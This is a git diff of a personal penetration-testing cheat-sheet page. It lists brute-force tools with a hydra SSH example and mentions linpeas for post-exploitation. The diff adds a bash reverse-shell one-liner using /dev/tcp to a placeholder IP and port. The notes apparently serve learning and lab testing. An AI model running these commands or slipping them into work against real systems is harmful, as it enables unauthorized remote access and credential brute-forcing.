@@ -8,11 +8,6 @@ toc: true
 toc_sticky: true
 author_profile: true
 ---
-<style>
-    ul {
-        margin-top: 0.1;
-    }
-</style>
 
 # Welcome
 Hi, this page is because I can't for the life of me remember my options when I am trying to web-test.  
@@ -23,7 +18,7 @@ flask -> usually jinja2
 
 ## Brute-Force
 ffuf  
-cme - SMB brute force tool
+cme - SMB brute force tool  
 hydra:  
 ex: ```hydra -l usr -P pass.txt ssh://www.example.com```
 
@@ -56,9 +51,16 @@ after get shell:
 * makes able to clear term
 * better machine access
 
+bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1
+
+
 ## Other
 Pspy - inspect application
 
 
 ## Refrance links 
 tbd
+
+## Post exploitation
+look for weird configs  
+linpeas.sh big
